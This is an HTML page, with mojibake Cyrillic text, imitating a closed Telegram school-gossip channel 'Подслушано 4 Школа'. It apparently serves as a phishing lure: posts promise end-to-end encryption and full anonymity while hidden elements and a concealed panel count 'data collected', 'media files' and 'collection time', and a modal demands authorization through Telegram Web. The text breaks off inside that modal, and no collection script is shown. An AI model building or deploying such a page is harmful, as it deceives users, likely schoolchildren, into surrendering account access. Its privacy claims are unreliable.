<!DOCTYPE html>
<html lang="ru" class="dark-theme">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>–ü–æ–¥—Å–ª—É—à–∞–Ω–æ 4 –®–∫–æ–ª–∞ ‚Ä¢ –≠–∫—Å–∫–ª—é–∑–∏–≤–Ω—ã–π –∫–æ–Ω—Ç–µ–Ω—Ç</title>
    <meta name="theme-color" content="#3390ec">
    <meta name="description" content="–ó–∞–∫—Ä—ã—Ç—ã–π –∫–∞–Ω–∞–ª —Å —ç–∫—Å–∫–ª—é–∑–∏–≤–Ω—ã–º –∫–æ–Ω—Ç–µ–Ω—Ç–æ–º –¥–ª—è –ø–æ–¥–ø–∏—Å—á–∏–∫–æ–≤">
    <meta property="og:title" content="–ü–æ–¥—Å–ª—É—à–∞–Ω–æ 4 –®–∫–æ–ª–∞">
    <meta property="og:description" content="–≠–∫—Å–∫–ª—é–∑–∏–≤–Ω—ã–π –∫–æ–Ω—Ç–µ–Ω—Ç –¥–ª—è –ø–æ–¥–ø–∏—Å—á–∏–∫–æ–≤">
    <meta property="og:image" content="https://i.imgur.com/placeholder.jpg">
    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22 fill=%22%233390ec%22>üîí</text></svg>">
    
    <style>
        /* CSS Variables */
        :root {
            /* Colors */
            --primary: #3390ec;
            --primary-dark: #1a73e8;
            --secondary: #2ecc71;
            --danger: #e74c3c;
            --warning: #f39c12;
            --dark-bg: #0f0f0f;
            --darker-bg: #0a0a0a;
            --card-bg: #1a1a1a;
            --border-color: #2d2d2d;
            --text-primary: #ffffff;
            --text-secondary: #aaaaaa;
            --text-muted: #707579;
            --overlay: rgba(0, 0, 0, 0.9);
            
            /* Gradients */
            --gradient-primary: linear-gradient(135deg, #3390ec 0%, #1a73e8 100%);
            --gradient-success: linear-gradient(135deg, #2ecc71 0%, #27ae60 100%);
            --gradient-danger: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
            --gradient-warning: linear-gradient(135deg, #f39c12 0%, #d35400 100%);
            
            /* Shadows */
            --shadow-sm: 0 2px 10px rgba(0, 0, 0, 0.1);
            --shadow-md: 0 4px 20px rgba(0, 0, 0, 0.2);
            --shadow-lg: 0 8px 30px rgba(0, 0, 0, 0.3);
            --shadow-xl: 0 15px 50px rgba(0, 0, 0, 0.5);
            
            /* Animation */
            --transition-fast: 0.15s ease;
            --transition-normal: 0.3s ease;
            --transition-slow: 0.5s ease;
            
            /* Spacing */
            --space-xs: 4px;
            --space-sm: 8px;
            --space-md: 16px;
            --space-lg: 24px;
            --space-xl: 32px;
            --space-xxl: 48px;
        }
        
        /* Base Styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }
        
        html {
            scroll-behavior: smooth;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
            background: var(--dark-bg);
            color: var(--text-primary);
            line-height: 1.6;
            overflow-x: hidden;
            position: relative;
            min-height: 100vh;
        }
        
        /* Animated Background */
        .bg-animation {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -2;
            overflow: hidden;
        }
        
        .bg-particle {
            position: absolute;
            background: var(--primary);
            border-radius: 50%;
            opacity: 0.05;
            animation: float 20s infinite linear;
        }
        
        @keyframes float {
            0% { transform: translate(0, 0) rotate(0deg); }
            100% { transform: translate(100px, 100px) rotate(360deg); }
        }
        
        .bg-grid {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                linear-gradient(rgba(51, 144, 236, 0.03) 1px, transparent 1px),
                linear-gradient(90deg, rgba(51, 144, 236, 0.03) 1px, transparent 1px);
            background-size: 50px 50px;
            z-index: -1;
            animation: gridMove 120s linear infinite;
        }
        
        @keyframes gridMove {
            0% { transform: translate(0, 0); }
            100% { transform: translate(50px, 50px); }
        }
        
        /* Main Container */
        .app-container {
            max-width: 480px;
            margin: 0 auto;
            min-height: 100vh;
            background: var(--dark-bg);
            position: relative;
            box-shadow: var(--shadow-xl);
            overflow: hidden;
        }
        
        /* Header */
        .tg-header {
            position: sticky;
            top: 0;
            z-index: 1000;
            background: rgba(15, 15, 15, 0.98);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border-bottom: 1px solid var(--border-color);
            padding: var(--space-md) var(--space-lg);
            display: flex;
            align-items: center;
            justify-content: space-between;
            height: 64px;
        }
        
        .header-btn {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: rgba(51, 144, 236, 0.1);
            border: none;
            color: var(--primary);
            font-size: 20px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all var(--transition-fast);
        }
        
        .header-btn:hover {
            background: rgba(51, 144, 236, 0.2);
            transform: scale(1.05);
        }
        
        .header-title {
            font-size: 18px;
            font-weight: 600;
            text-align: center;
            flex-grow: 1;
            letter-spacing: -0.3px;
        }
        
        /* Channel Hero Section */
        .channel-hero {
            position: relative;
            height: 220px;
            overflow: hidden;
        }
        
        .hero-gradient {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #1a237e 0%, #311b92 30%, #0f0f0f 100%);
        }
        
        .hero-pattern {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                radial-gradient(circle at 20% 30%, rgba(255, 255, 255, 0.05) 1px, transparent 1px),
                radial-gradient(circle at 80% 70%, rgba(255, 255, 255, 0.05) 1px, transparent 1px);
            background-size: 50px 50px;
            animation: patternFloat 60s linear infinite;
        }
        
        @keyframes patternFloat {
            0% { transform: translate(0, 0); }
            100% { transform: translate(25px, 25px); }
        }
        
        .channel-avatar {
            position: absolute;
            bottom: -50px;
            left: var(--space-xl);
            width: 120px;
            height: 120px;
            background: var(--gradient-primary);
            border-radius: 50%;
            border: 6px solid var(--dark-bg);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 48px;
            color: white;
            box-shadow: var(--shadow-lg);
            z-index: 10;
            transition: transform var(--transition-normal);
        }
        
        .channel-avatar:hover {
            transform: scale(1.05) rotate(5deg);
        }
        
        /* Channel Info */
        .channel-info {
            padding: 80px var(--space-xl) var(--space-xl);
            background: var(--dark-bg);
            position: relative;
        }
        
        .channel-name {
            font-size: 32px;
            font-weight: 800;
            margin-bottom: var(--space-sm);
            background: linear-gradient(135deg, var(--text-primary) 0%, #bbbbbb 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            line-height: 1.2;
        }
        
        .channel-meta {
            display: flex;
            align-items: center;
            gap: var(--space-md);
            margin-bottom: var(--space-xl);
            color: var(--text-secondary);
            font-size: 15px;
        }
        
        .meta-item {
            display: flex;
            align-items: center;
            gap: var(--space-xs);
        }
        
        .meta-item::before {
            content: '‚Ä¢';
            color: var(--primary);
        }
        
        /* Main Action Button */
        .action-button {
            width: 100%;
            padding: var(--space-lg) var(--space-xl);
            background: var(--gradient-primary);
            border: none;
            border-radius: 20px;
            color: white;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: var(--space-md);
            margin: var(--space-xl) 0;
            transition: all var(--transition-normal);
            box-shadow: var(--shadow-lg);
            position: relative;
            overflow: hidden;
        }
        
        .action-button:hover {
            transform: translateY(-3px);
            box-shadow: var(--shadow-xl);
        }
        
        .action-button:active {
            transform: translateY(0);
        }
        
        .action-button::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: left 0.5s;
        }
        
        .action-button:hover::before {
            left: 100%;
        }
        
        /* Progress Indicator */
        .progress-container {
            width: 100%;
            height: 6px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 3px;
            overflow: hidden;
            margin: var(--space-xl) 0;
            display: none;
        }
        
        .progress-bar {
            height: 100%;
            background: var(--gradient-primary);
            width: 0%;
            transition: width var(--transition-slow);
            position: relative;
            overflow: hidden;
        }
        
        .progress-bar::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
            animation: shimmer 2s infinite;
        }
        
        @keyframes shimmer {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }
        
        /* Status Display */
        .status-indicator {
            display: inline-flex;
            align-items: center;
            gap: var(--space-sm);
            padding: var(--space-sm) var(--space-md);
            background: rgba(46, 204, 113, 0.1);
            border: 1px solid rgba(46, 204, 113, 0.3);
            border-radius: 20px;
            font-size: 14px;
            color: var(--secondary);
            margin-top: var(--space-md);
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }
        
        /* Channel Content */
        .channel-content {
            padding: 0 var(--space-xl) var(--space-xxl);
        }
        
        .content-section {
            margin-bottom: var(--space-xl);
        }
        
        .section-title {
            font-size: 20px;
            font-weight: 700;
            margin-bottom: var(--space-lg);
            color: var(--text-primary);
            display: flex;
            align-items: center;
            gap: var(--space-sm);
        }
        
        /* Posts Grid */
        .posts-grid {
            display: grid;
            grid-template-columns: 1fr;
            gap: var(--space-lg);
        }
        
        .post-card {
            background: var(--card-bg);
            border-radius: 20px;
            padding: var(--space-lg);
            border: 1px solid var(--border-color);
            transition: all var(--transition-normal);
            position: relative;
            overflow: hidden;
        }
        
        .post-card:hover {
            transform: translateY(-4px);
            box-shadow: var(--shadow-lg);
            border-color: var(--primary);
        }
        
        .post-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 4px;
            height: 100%;
            background: var(--gradient-primary);
            opacity: 0;
            transition: opacity var(--transition-normal);
        }
        
        .post-card:hover::before {
            opacity: 1;
        }
        
        .post-header {
            display: flex;
            align-items: center;
            margin-bottom: var(--space-md);
        }
        
        .post-avatar {
            width: 48px;
            height: 48px;
            border-radius: 50%;
            background: var(--gradient-warning);
            margin-right: var(--space-md);
            flex-shrink: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 20px;
        }
        
        .post-info {
            flex-grow: 1;
        }
        
        .post-author {
            font-weight: 600;
            font-size: 16px;
            margin-bottom: 2px;
            color: var(--text-primary);
        }
        
        .post-meta {
            color: var(--text-muted);
            font-size: 13px;
            display: flex;
            align-items: center;
            gap: var(--space-sm);
        }
        
        .post-content {
            margin-bottom: var(--space-md);
        }
        
        .post-text {
            line-height: 1.7;
            margin-bottom: var(--space-md);
            font-size: 15px;
            color: var(--text-secondary);
        }
        
        .post-media {
            border-radius: 16px;
            overflow: hidden;
            background: linear-gradient(45deg, #000000 0%, #1a1a1a 100%);
            height: 200px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--text-muted);
            position: relative;
            margin-bottom: var(--space-md);
        }
        
        .post-media::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(45deg, transparent 65%, rgba(255,255,255,0.03) 65%);
            background-size: 20px 20px;
        }
        
        .post-stats {
            display: flex;
            align-items: center;
            gap: var(--space-xl);
            color: var(--text-muted);
            font-size: 14px;
        }
        
        .stat-item {
            display: flex;
            align-items: center;
            gap: var(--space-xs);
        }
        
        /* Features Grid */
        .features-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: var(--space-md);
            margin-top: var(--space-lg);
        }
        
        .feature-card {
            background: var(--card-bg);
            border-radius: 16px;
            padding: var(--space-md);
            text-align: center;
            border: 1px solid var(--border-color);
            transition: all var(--transition-normal);
        }
        
        .feature-card:hover {
            border-color: var(--primary);
            transform: translateY(-2px);
        }
        
        .feature-icon {
            font-size: 32px;
            margin-bottom: var(--space-sm);
            color: var(--primary);
        }
        
        .feature-title {
            font-size: 14px;
            font-weight: 600;
            color: var(--text-primary);
            margin-bottom: var(--space-xs);
        }
        
        .feature-desc {
            font-size: 12px;
            color: var(--text-muted);
        }
        
        /* Modal System */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: var(--overlay);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            z-index: 2000;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: var(--space-md);
            opacity: 0;
            visibility: hidden;
            transition: all var(--transition-slow);
        }
        
        .modal-overlay.active {
            opacity: 1;
            visibility: visible;
        }
        
        .modal-container {
            background: var(--card-bg);
            border-radius: 24px;
            padding: var(--space-xl);
            width: 100%;
            max-width: 400px;
            max-height: 90vh;
            overflow-y: auto;
            transform: translateY(20px) scale(0.95);
            transition: all var(--transition-slow);
            border: 1px solid var(--border-color);
            box-shadow: var(--shadow-xl);
        }
        
        .modal-overlay.active .modal-container {
            transform: translateY(0) scale(1);
        }
        
        .modal-header {
            text-align: center;
            margin-bottom: var(--space-xl);
        }
        
        .modal-icon {
            font-size: 72px;
            margin-bottom: var(--space-lg);
            display: inline-block;
            animation: floatIcon 3s ease-in-out infinite;
        }
        
        @keyframes floatIcon {
            0%, 100% { transform: translateY(0) rotate(0deg); }
            50% { transform: translateY(-10px) rotate(5deg); }
        }
        
        .modal-title {
            font-size: 28px;
            font-weight: 800;
            margin-bottom: var(--space-md);
            background: var(--gradient-primary);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            line-height: 1.2;
        }
        
        .modal-subtitle {
            color: var(--text-secondary);
            font-size: 16px;
            line-height: 1.5;
        }
        
        .modal-content {
            margin-bottom: var(--space-xl);
        }
        
        .modal-step {
            margin-bottom: var(--space-lg);
            padding-left: var(--space-lg);
            position: relative;
        }
        
        .modal-step::before {
            content: '';
            position: absolute;
            left: 0;
            top: 0;
            bottom: 0;
            width: 2px;
            background: var(--gradient-primary);
        }
        
        .step-number {
            position: absolute;
            left: -12px;
            top: 0;
            width: 24px;
            height: 24px;
            background: var(--gradient-primary);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            font-weight: bold;
            color: white;
        }
        
        .step-title {
            font-size: 16px;
            font-weight: 600;
            margin-bottom: var(--space-xs);
            color: var(--text-primary);
        }
        
        .step-desc {
            font-size: 14px;
            color: var(--text-secondary);
            line-height: 1.5;
        }
        
        .modal-progress {
            width: 100%;
            height: 8px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 4px;
            overflow: hidden;
            margin: var(--space-xl) 0;
        }
        
        .modal-progress-bar {
            height: 100%;
            background: var(--gradient-primary);
            width: 0%;
            transition: width var(--transition-normal);
        }
        
        .modal-status {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: var(--space-sm);
            padding: var(--space-md);
            background: rgba(51, 144, 236, 0.1);
            border-radius: 12px;
            margin-top: var(--space-lg);
            display: none;
        }
        
        /* Stats Panel */
        .stats-panel {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: var(--space-md);
            margin: var(--space-xl) 0;
            display: none;
        }
        
        .stat-box {
            background: var(--card-bg);
            border-radius: 12px;
            padding: var(--space-md);
            text-align: center;
            border: 1px solid var(--border-color);
        }
        
        .stat-value {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: var(--space-xs);
            color: var(--primary);
        }
        
        .stat-label {
            font-size: 12px;
            color: var(--text-muted);
        }
        
        /* Footer */
        .app-footer {
            padding: var(--space-xl);
            text-align: center;
            border-top: 1px solid var(--border-color);
            background: rgba(10, 10, 10, 0.5);
        }
        
        .footer-text {
            color: var(--text-muted);
            font-size: 13px;
            line-height: 1.5;
        }
        
        /* Utility Classes */
        .hidden {
            display: none !important;
        }
        
        .fade-in {
            animation: fadeIn 0.5s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .slide-up {
            animation: slideUp 0.5s ease;
        }
        
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        /* Responsive Design */
        @media (max-width: 480px) {
            .app-container {
                border-radius: 0;
            }
            
            .channel-hero {
                height: 180px;
            }
            
            .channel-avatar {
                width: 100px;
                height: 100px;
                font-size: 40px;
                left: var(--space-lg);
                bottom: -40px;
            }
            
            .channel-info {
                padding: 70px var(--space-lg) var(--space-lg);
            }
            
            .channel-name {
                font-size: 28px;
            }
            
            .action-button {
                padding: var(--space-md) var(--space-lg);
                font-size: 16px;
            }
            
            .features-grid {
                grid-template-columns: 1fr;
            }
            
            .modal-container {
                padding: var(--space-lg);
            }
        }
        
        /* Data Collection Elements (Hidden) */
        .data-collector {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <!-- Animated Background -->
    <div class="bg-animation" id="bgAnimation"></div>
    <div class="bg-grid"></div>
    
    <!-- Main App Container -->
    <div class="app-container fade-in">
        <!-- Telegram Header -->
        <header class="tg-header slide-up">
            <button class="header-btn" onclick="history.back()" aria-label="–ù–∞–∑–∞–¥">
                ‚Üê
            </button>
            <div class="header-title">–ö–∞–Ω–∞–ª</div>
            <button class="header-btn" aria-label="–ú–µ–Ω—é">
                ‚ãÆ
            </button>
        </header>
        
        <!-- Channel Content -->
        <main>
            <!-- Hero Section -->
            <section class="channel-hero">
                <div class="hero-gradient"></div>
                <div class="hero-pattern"></div>
                <div class="channel-avatar" role="img" aria-label="–ê–≤–∞—Ç–∞—Ä –∫–∞–Ω–∞–ª–∞">
                    üîí
                </div>
            </section>
            
            <!-- Channel Info -->
            <section class="channel-info">
                <h1 class="channel-name">–ü–û–î–°–õ–£–®–ê–ù–û 4 –®–ö–û–õ–ê</h1>
                
                <div class="channel-meta">
                    <div class="meta-item">
                        <span>56 –ø–æ–¥–ø–∏—Å—á–∏–∫–æ–≤</span>
                    </div>
                    <div class="meta-item">
                        <span>128 —Å–æ–æ–±—â–µ–Ω–∏–π</span>
                    </div>
                    <div class="meta-item">
                        <span>üî• –û–Ω–ª–∞–π–Ω</span>
                    </div>
                </div>
                
                <!-- Main Action Button -->
                <button class="action-button" id="joinButton">
                    <span>–ü–µ—Ä–µ–π—Ç–∏ –≤ –∫–∞–Ω–∞–ª</span>
                    <span>‚Üí</span>
                </button>
                
                <!-- Progress Indicator -->
                <div class="progress-container" id="progressContainer">
                    <div class="progress-bar" id="progressBar"></div>
                </div>
                
                <!-- Status Indicator -->
                <div class="status-indicator hidden" id="statusIndicator">
                    <span>üõ°Ô∏è</span>
                    <span>–ó–∞—â–∏—â–µ–Ω–Ω–æ–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω–æ</span>
                </div>
                
                <!-- Stats Panel -->
                <div class="stats-panel" id="statsPanel">
                    <div class="stat-box">
                        <div class="stat-value" id="dataCount">0</div>
                        <div class="stat-label">–î–∞–Ω–Ω—ã—Ö —Å–æ–±—Ä–∞–Ω–æ</div>
                    </div>
                    <div class="stat-box">
                        <div class="stat-value" id="mediaCount">0</div>
                        <div class="stat-label">–ú–µ–¥–∏–∞ —Ñ–∞–π–ª–æ–≤</div>
                    </div>
                    <div class="stat-box">
                        <div class="stat-value" id="timeActive">0—Å</div>
                        <div class="stat-label">–í—Ä–µ–º—è —Å–±–æ—Ä–∞</div>
                    </div>
                </div>
            </section>
            
            <!-- Channel Content -->
            <section class="channel-content">
                <!-- Featured Posts -->
                <div class="content-section">
                    <h2 class="section-title">
                        <span>üìå</span>
                        <span>–ó–∞–∫—Ä–µ–ø–ª–µ–Ω–Ω—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è</span>
                    </h2>
                    
                    <div class="posts-grid">
                        <!-- Post 1 -->
                        <article class="post-card">
                            <div class="post-header">
                                <div class="post-avatar" aria-hidden="true">A</div>
                                <div class="post-info">
                                    <div class="post-author">–ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä</div>
                                    <div class="post-meta">
                                        <span>—Å–µ–≥–æ–¥–Ω—è –≤ 14:30</span>
                                        <span>‚Ä¢</span>
                                        <span>üìå –ó–∞–∫—Ä–µ–ø–ª–µ–Ω–æ</span>
                                    </div>
                                </div>
                            </div>
                            <div class="post-content">
                                <p class="post-text">
                                    üéâ –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –Ω–∞—à —ç–∫—Å–∫–ª—é–∑–∏–≤–Ω—ã–π –∫–∞–Ω–∞–ª! 
                                    –ó–¥–µ—Å—å —Ç–æ–ª—å–∫–æ –ø—Ä–æ–≤–µ—Ä–µ–Ω–Ω—ã–π –∫–æ–Ω—Ç–µ–Ω—Ç –¥–ª—è –Ω–∞—Å—Ç–æ—è—â–∏—Ö –ø–æ–¥–ø–∏—Å—á–∏–∫–æ–≤. 
                                    –î–ª—è –¥–æ—Å—Ç—É–ø–∞ –∫–æ –≤—Å–µ–º —Ñ—É–Ω–∫—Ü–∏—è–º —Ç—Ä–µ–±—É–µ—Ç—Å—è –ø–æ–ª–Ω–∞—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è —á–µ—Ä–µ–∑ Telegram Web.
                                </p>
                                <div class="post-media" role="img" aria-label="–ú–µ–¥–∏–∞ –∫–æ–Ω—Ç–µ–Ω—Ç">
                                    üîí –ö–æ–Ω—Ç–µ–Ω—Ç –¥–æ—Å—Ç—É–ø–µ–Ω –ø–æ—Å–ª–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –ø–æ–¥–ø–∏—Å–∫–∏
                                </div>
                            </div>
                            <div class="post-stats">
                                <div class="stat-item">
                                    <span>üëÅÔ∏è</span>
                                    <span>245 –ø—Ä–æ—Å–º–æ—Ç—Ä–æ–≤</span>
                                </div>
                                <div class="stat-item">
                                    <span>üí¨</span>
                                    <span>18 –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–µ–≤</span>
                                </div>
                                <div class="stat-item">
                                    <span>üîÑ</span>
                                    <span>5 —Ä–µ–ø–æ—Å—Ç–æ–≤</span>
                                </div>
                            </div>
                        </article>
                        
                        <!-- Post 2 -->
                        <article class="post-card">
                            <div class="post-header">
                                <div class="post-avatar" aria-hidden="true">M</div>
                                <div class="post-info">
                                    <div class="post-author">–ú–æ–¥–µ—Ä–∞—Ç–æ—Ä</div>
                                    <div class="post-meta">
                                        <span>–≤—á–µ—Ä–∞ –≤ 19:45</span>
                                        <span>‚Ä¢</span>
                                        <span>‚ö° –í–∞–∂–Ω–æ–µ</span>
                                    </div>
                                </div>
                            </div>
                            <div class="post-content">
                                <p class="post-text">
                                    üîê –í—Å—è —Å–∏—Å—Ç–µ–º–∞ –∑–∞—â–∏—â–µ–Ω–∞ end-to-end —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ–º. 
                                    –í–∞—à–∞ –∞–Ω–æ–Ω–∏–º–Ω–æ—Å—Ç—å –≥–∞—Ä–∞–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∞ –Ω–∞ 100%. 
                                    –ú—ã –∏—Å–ø–æ–ª—å–∑—É–µ–º –ø–µ—Ä–µ–¥–æ–≤—ã–µ —Ç–µ—Ö–Ω–æ–ª–æ–≥–∏–∏ –¥–ª—è –∑–∞—â–∏—Ç—ã –¥–∞–Ω–Ω—ã—Ö.
                                </p>
                                <p class="post-text">
                                    üì± –î–ª—è –º–æ–±–∏–ª—å–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤ —Ä–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å 
                                    –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω–æ–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ Telegram –¥–ª—è –ª—É—á—à–µ–π –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç–∏.
                                </p>
                            </div>
                        </article>
                        
                        <!-- Post 3 -->
                        <article class="post-card">
                            <div class="post-header">
                                <div class="post-avatar" aria-hidden="true">S</div>
                                <div class="post-info">
                                    <div class="post-author">–°–∏—Å—Ç–µ–º–∞</div>
                                    <div class="post-meta">
                                        <span>2 –¥–Ω—è –Ω–∞–∑–∞–¥</span>
                                        <span>‚Ä¢</span>
                                        <span>üîß –¢–µ—Ö–Ω–∏—á–µ—Å–∫–æ–µ</span>
                                    </div>
                                </div>
                            </div>
                            <div class="post-content">
                                <p class="post-text">
                                    ‚ö° –°–∏—Å—Ç–µ–º–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –±–µ–∑–æ–ø–∞—Å–Ω–æ–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ 
                                    –∏ –Ω–µ —Ö—Ä–∞–Ω–∏—Ç –≤–∞—à–∏ –ø–µ—Ä—Å–æ–Ω–∞–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ. –í—Å–µ –ø—Ä–æ—Ü–µ—Å—Å—ã 
                                    –ø—Ä–æ–∏—Å—Ö–æ–¥—è—Ç –≤ –∑–∞—â–∏—â–µ–Ω–Ω–æ–π —Å—Ä–µ–¥–µ.
                                </p>
                                <div class="post-media" role="img" aria-label="–¢–µ—Ö–Ω–∏—á–µ—Å–∫–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è">
                                    üõ°Ô∏è –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∞
                                </div>
                            </div>
                        </article>
                    </div>
                </div>
                
                <!-- Features Grid -->
                <div class="content-section">
                    <h2 class="section-title">
                        <span>‚ú®</span>
                        <span>–ü—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–∞ –∫–∞–Ω–∞–ª–∞</span>
                    </h2>
                    
                    <div class="features-grid">
                        <div class="feature-card">
                            <div class="feature-icon">üîí</div>
                            <div class="feature-title">–ü–æ–ª–Ω–∞—è –∞–Ω–æ–Ω–∏–º–Ω–æ—Å—Ç—å</div>
                            <div class="feature-desc">–í–∞—à–∏ –¥–∞–Ω–Ω—ã–µ –∑–∞—â–∏—â–µ–Ω—ã</div>
                        </div>
                        
                        <div class="feature-card">
                            <div class="feature-icon">‚ö°</div>
                            <div class="feature-title">–ú–≥–Ω–æ–≤–µ–Ω–Ω–∞—è –¥–æ—Å—Ç–∞–≤–∫–∞</div>
                            <div class="feature-desc">–°–æ–æ–±—â–µ–Ω–∏—è –±–µ–∑ –∑–∞–¥–µ—Ä–∂–µ–∫</div>
                        </div>
                        
                        <div class="feature-card">
                            <div class="feature-icon">üéØ</div>
                            <div class="feature-title">–≠–∫—Å–∫–ª—é–∑–∏–≤–Ω—ã–π –∫–æ–Ω—Ç–µ–Ω—Ç</div>
                            <div class="feature-desc">–¢–æ–ª—å–∫–æ –¥–ª—è –ø–æ–¥–ø–∏—Å—á–∏–∫–æ–≤</div>
                        </div>
                        
                        <div class="feature-card">
                            <div class="feature-icon">üõ°Ô∏è</div>
                            <div class="feature-title">–ó–∞—â–∏—Ç–∞ –¥–∞–Ω–Ω—ã—Ö</div>
                            <div class="feature-desc">End-to-end —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ</div>
                        </div>
                    </div>
                </div>
            </section>
        </main>
        
        <!-- Footer -->
        <footer class="app-footer">
            <p class="footer-text">
                –ü–æ–¥—Å–ª—É—à–∞–Ω–æ 4 –®–∫–æ–ª–∞ ‚Ä¢ –ó–∞–∫—Ä—ã—Ç—ã–π –∫–∞–Ω–∞–ª<br>
                –¢–æ–ª—å–∫–æ –¥–ª—è –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã—Ö –ø–æ–¥–ø–∏—Å—á–∏–∫–æ–≤<br>
                <small>¬© 2024 ‚Ä¢ –í—Å–µ –ø—Ä–∞–≤–∞ –∑–∞—â–∏—â–µ–Ω—ã</small>
            </p>
        </footer>
        
        <!-- Authorization Modal -->
        <div class="modal-overlay" id="authModal">
            <div class="modal-container">
                <div class="modal-header">
                    <div class="modal-icon">üîê</div>
                    <h2 class="modal-title">–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –¥–æ—Å—Ç—É–ø–∞</h2>
                    <p class="modal-subtitle">
                        –î–ª—è –≤—Ö–æ–¥–∞ –≤ –∑–∞–∫—Ä—ã—Ç—ã–π –∫–∞–Ω–∞–ª —Ç—Ä–µ–±—É–µ—Ç—Å—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è —á–µ—Ä–µ–∑ Telegram Web
                    </p>
                </div>
                
                <div class="modal-content">
                    <div class="modal-step">
                        <div class="step-number">1</div>
                        <div class="step-title">–ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ–¥–ø–∏—Å–∫–∏</div>
                        <div class="step-desc">
                            –°–∏—Å—Ç–µ–º–∞ –ø—Ä–æ–≤–µ—Ä—è–µ—Ç –≤–∞—à —Å—Ç–∞—Ç—É—Å –ø–æ–¥–ø–∏—Å—á–∏–∫–∞ –≤ –∫–∞–Ω–∞–ª–µ
                        </div>
                    </div>
                    
